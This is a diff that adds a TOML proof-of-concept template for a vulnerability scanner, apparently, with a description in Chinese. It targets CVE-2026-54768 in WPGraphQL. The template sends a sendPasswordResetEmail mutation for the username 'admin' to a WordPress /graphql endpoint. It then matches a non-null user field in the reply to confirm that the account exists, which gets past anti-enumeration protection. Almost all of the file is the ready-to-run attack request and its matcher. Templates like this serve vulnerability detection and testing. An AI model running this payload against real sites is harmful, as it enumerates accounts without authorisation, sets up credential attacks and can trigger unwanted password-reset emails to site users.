@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "通过 sendPasswordResetEmail mutation 的废弃 user 字段判断用户是否存在。向 WordPress GraphQL 端点发送包含目标用户名的密码重置请求，若返回的 user 字段非 null 则说明该用户为作者类用户，从而绕过反枚举机制实现用户身份枚举。"
+id = "POC-AVE-2026-0801"
+name = "WPGraphQL SendPasswordResetEmail 用户枚举 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-54768",
+    "wpgraphql",
+    "user-enumeration",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2026-54768",
+    "AVE-2026-0801",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/graphql"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"query":"mutation { sendPasswordResetEmail(input: {username: \"admin\"}) { success user { databaseId name slug } } }"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"user":{"databaseId"']
